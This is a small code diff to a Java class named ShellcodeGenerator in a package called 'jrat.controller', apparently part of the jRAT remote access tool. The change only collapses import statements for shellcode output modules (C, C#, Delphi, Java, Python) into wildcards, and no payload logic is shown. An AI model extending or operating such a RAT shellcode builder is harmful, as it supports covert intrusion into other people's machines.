@@ -1,16 +1,11 @@
 package jrat.controller;
 
-import jrat.controller.build.shellcode.C;
-import jrat.controller.build.shellcode.CSharp;
-import jrat.controller.build.shellcode.Delphi;
-import jrat.controller.build.shellcode.Java;
-import jrat.controller.build.shellcode.Python;
-import jrat.controller.build.shellcode.Shellcode;
+import jrat.controller.build.shellcode.*;
 
+import javax.swing.*;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileWriter;
-import javax.swing.JOptionPane;
 
 public class ShellcodeGenerator {
 
